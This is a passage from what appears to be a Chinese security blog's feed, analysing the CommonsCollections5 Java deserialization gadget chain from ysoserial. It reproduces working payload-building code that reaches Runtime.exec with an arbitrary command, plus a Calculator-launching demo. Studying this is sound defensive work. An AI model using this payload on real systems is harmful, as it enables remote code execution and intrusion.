&lt;/li&gt;
&lt;li&gt;&lt;p&gt;直接用homebrew安装tomcat，&lt;code</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CommonsCollections5</title>
    <link href="https://an0th3r.github.io/CommonsCollections5/"/>
    <id>https://an0th3r.github.io/CommonsCollections5/</id>
    <published>2022-04-25T02:24:20.000Z</published>
    <updated>2022-04-25T02:24:20.504Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CC5链源代码"><a href="#CC5链源代码" class="headerlink" title="CC5链源代码"></a>CC5链源代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> BadAttributeValueExpException <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 创建一个字符串数组存储要执行的命令</span></span><br><span class="line">    <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125; ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125; ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, execArgs),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) </span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    Reflections.setAccessible(valfield);</span><br><span class="line">    valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC5链构成过程"><a href="#CC5链构成过程" class="headerlink" title="CC5链构成过程"></a>CC5链构成过程</h2><p>根据ysoserial在源代码中的注释，方便我们对payload的理解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">      ObjectInputStream.readObject()</span><br><span class="line">          BadAttributeValueExpException.readObject()</span><br><span class="line">              TiedMapEntry.toString()</span><br><span class="line">                  LazyMap.get()</span><br><span class="line">                      ChainedTransformer.transform()</span><br><span class="line">                          ConstantTransformer.transform()</span><br><span class="line">                          InvokerTransformer.transform()</span><br><span class="line">                              Method.invoke()</span><br><span class="line">                                  Class.getMethod()</span><br><span class="line">                          InvokerTransformer.transform()</span><br><span class="line">                              Method.invoke()</span><br><span class="line">                                  Runtime.getRuntime()</span><br><span class="line">                          InvokerTransformer.transform()</span><br><span class="line">                              Method.invoke()</span><br><span class="line">                                  Runtime.exec()</span><br></pre></td></tr></table></figure><p>在程序执行<code>ObjectInputStream.readObject()</code>，进入反序列化过程。整个Gadget构建在<code>BadAttributeValue</code>下，也是通过该对象的反序列化构建出命令执行过程，跟入<code>BadAttributeValue</code>中</p><p><img src="/CommonsCollections5/BadAttributeValueExpException_readObject.png" alt="Untitled"></p><p>在72通过<code>get</code>方法获取<code>val</code>的值，该获取的值在经历一系列类型判断后调用该对象的<code>toString</code>方法。根据源代码，我们知道valObj的类型为<code>TiedMapEntry</code></p><p><img src="/CommonsCollections5/TiedMapEntry_toString.png" alt="Untitled"></p><p>在<code>toString</code>方法中，调用了<code>getKey</code>与<code>getValue</code>方法，跟进<code>getValue</code>，它调用了Map接口中的get方法。</p><p><img src="/CommonsCollections5/LazyMap_get.png" alt="Untitled"></p><p>而<code>LazyMap</code>继承<code>AbstractMapDecorator</code>实现了Map接口，并实现了get方法</p><p><img src="/CommonsCollections5/get.png" alt="Untitled"></p><p>在执行get方法过程中会执行<code>factory.transform</code>，跟进factory的定义，它通过源代码中<code>final Map lazyMap = LazyMap.decorate(innerMap, transformerChain)</code>声明，根据传入的transformerChain的类型可知其为<code>ChainedTransformer</code>。跟进<code>ChainedTransformer</code>中的<code>transform</code>方法，它遍历执行了传入的object</p><p><img src="/CommonsCollections5/ChainedTransformer_transform.png" alt="Untitled"></p><h2 id="CC中类的解释"><a href="#CC中类的解释" class="headerlink" title="CC中类的解释"></a>CC中类的解释</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>Transformer是一个接口，定义了一个transform方法</p><p><img src="/CommonsCollections5/Transformer_interface.png" alt="Untitled"></p><h3 id="functors-ChainedTransformer"><a href="#functors-ChainedTransformer" class="headerlink" title="functors.ChainedTransformer"></a>functors.ChainedTransformer</h3><p>实现Transformer链式调用，通过一个Transformer数组</p><p><strong>构造函数</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/CommonsCollections5/ChainedTransformer_transform.png" alt="Untitled"></p><p>在transform方法通过遍历Transformer数组每个对象，并调用每个对象的transform方法</p><h3 id="functors-InvokerTransformer"><a href="#functors-InvokerTransformer" class="headerlink" title="functors.InvokerTransformer"></a>functors.InvokerTransformer</h3><p>利用Java反射机制创建类实例，在该类中有如下几个函数</p><p><strong>构造函数InvokerTransformer</strong></p><p><img src="/CommonsCollections5/InvokerTransformer.png" alt="Untitled"></p><p><strong>核心类方法 transform</strong></p><p><img src="/CommonsCollections5/InvokerTransformer_transform.png" alt="Untitled"></p><p>通过这个类方法，我们可以直接实例化各种类，并传入任意参数，所以就可以直接构造命令执行实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">invokerTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure><h3 id="functors-ContantTransformer"><a href="#functors-ContantTransformer" class="headerlink" title="functors.ContantTransformer"></a>functors.ContantTransformer</h3><p>每次返回相同常量</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CC5链源代码&quot;&gt;&lt;a href=&quot;#CC5链源代码&quot; class=&quot;headerlink&quot; title=&quot;CC5链源代码&quot;&gt;&lt;/a&gt;CC5链源代码&lt;/h2&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;</summary>
      
    
    
    
    
  </entry>
  
</feed>
